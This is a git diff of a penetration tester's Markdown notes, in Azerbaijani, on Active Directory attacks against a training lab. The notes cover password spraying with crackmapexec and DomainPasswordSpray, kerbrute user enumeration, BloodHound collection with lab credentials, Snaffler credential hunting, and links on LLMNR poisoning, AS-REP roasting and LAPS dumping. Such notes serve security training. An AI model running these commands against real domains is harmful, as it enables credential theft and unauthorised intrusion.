@@ -32,12 +32,9 @@ nmap -p- -Pn -T4 --min-rate 2000 --stats-every 50 --max-retries 2 10.10.10.10 ( 
 [Username və Password tapılması üçün](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/Enumeration/Username_Password-Enumeration.md)
 ---
 
-
-
-# Active Directory Enumeration
-
 ### LLMNR/mDNS/NB-NS Poisining
 [LLMNR/mDNS/NB-NS Poisoning Faylına Get](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/LLMNR-NBTNS-mDNS-Poisining.md)
+---
 
 ### Password Policy
 ```
@@ -55,6 +52,7 @@ getdompwinfo
 6) import-module .\PowerView.ps1
 Get-DomainPolicy
 ```
+---
 
 ### Enumerate Username
 ```
@@ -79,6 +77,7 @@ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
 sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
 
 ```
+---
 
 ### Password Spraying
 ```
@@ -97,6 +96,7 @@ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de
 Import-Module .\DomainPasswordSpray.ps1
 Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
 ```
+---
 
 ## Credentialed Enumeration
 ```
@@ -126,6 +126,7 @@ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmc
 https://github.com/dirkjanm/BloodHound.py
 sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
 ```
+---
 
 ### Credential Enumeration - From Windows
 ```
@@ -172,6 +173,7 @@ Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
 
 .\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data -o result_snaffler.txt
 ```
+---
 
 ### Living off the Land
 ```
@@ -198,6 +200,7 @@ sc query windefend
 Get-MpComputerStatus
 qwinsta
 ```
+---
 
 ### Enumeration with PowerView
 ```
@@ -273,9 +276,12 @@ qwinsta
 67. BloodHound üçün data topla
 68. Bütün domain-ın ümumi statistikasını çıxar
 ```
+---
 
 ### AS-REP Roasting
 [Pre-Auth bağlı userləri tapıb hash çəkmək](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/AS-REP_Roasting.md)
+---
 
 ### LAPS Dumping
 [LAPS vasitəsilə istifadəçilərin şifrələrini ələ keçirmək](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD%20Guides/LAPS%20Dumping.md)
+---
